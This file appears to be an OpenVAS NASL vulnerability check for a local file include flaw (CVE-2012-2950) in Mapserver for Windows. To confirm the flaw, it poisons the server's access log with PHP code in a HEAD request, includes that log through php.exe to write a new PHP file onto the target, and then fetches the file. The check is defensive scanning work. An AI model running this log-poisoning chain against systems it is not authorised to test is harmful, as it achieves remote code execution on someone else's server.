###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mapserver4win_53737.nasl 3046 2016-04-11 13:53:51Z benallard $
#
# Mapserver for Windows Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Mapserver for Windows (MS4W) is prone to an local file include vulnerability
because it fails to sufficiently sanitize user supplied input.

An attacker can exploit this vulnerability to view files and execute
arbitrary local PHP scripts with the privileges of the affected
application.

Mapserver for Windows versions 2.0 through 3.0.4 are vulnerable.";

tag_solution = "Updates are available. Please contact the vendor for more information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103602";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(53737);
 script_cve_id("CVE-2012-2950");
 script_tag(name:"cvss_base", value:"9.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");

 script_version ("$Revision: 3046 $");

 script_name("Mapserver for Windows Local File Include Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53737");
 script_xref(name : "URL" , value : "http://maptools.org/ms4w/index.phtml?page=home.html");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/522908");

 script_tag(name:"last_modification", value:"$Date: 2016-04-11 15:53:51 +0200 (Mon, 11 Apr 2016) $");
 script_tag(name:"creation_date", value:"2012-11-02 10:11:35 +0100 (Fri, 02 Nov 2012)");
 script_summary("Determine if it is possible to execute php code");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list(cgi_dirs());

foreach dir (dirs) {
   
  url = dir  + '/index.phtml';

  if(http_vuln_check(port:port, url:url,pattern:"<title>MS4W")) {

    url = dir + '/phpinfo.php';
    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if("<title>phpinfo()" >!< buf)exit(0);

    lines = split(buf);

    foreach line(lines)  {
      if("DOCUMENT_ROOT" >< line) {
        pa = eregmatch(pattern:'class="v">(.+) </td></tr>', string:line);
        if(!isnull(pa[1])) {
          path = pa[1];
          break;
        }  
      }  
    }  

    if(!path || strlen(path) < 1)exit(0);

    file = 'openvas_' + rand() + '.php';
    php = "<?php file_put_contents('../htdocs/" + file +"', '<?php phpinfo();?>'); ?>";

    req = string("HEAD ", php,dir,"/ HTTP/1.1\r\n",
                 "Host: ", get_host_name(),"\r\n\r\n");

    soc = open_sock_tcp(port);
    if(!soc)exit(0);

    send(socket:soc, data:req);
    close(soc);

    path -= 'htdocs';
    path = str_replace(string:path, find:'/', replace:'\\');
    path = str_replace(string:path, find:" ", replace:"%20");

    url = dir + '/cgi-bin/php.exe?-f' +  path + 'logs\\access.log';
    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    url = dir + '/' + file;
    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if("<title>phpinfo()" >< buf) {
      security_message(port:port);
      exit(0);
    }  
  }
}

exit(0);

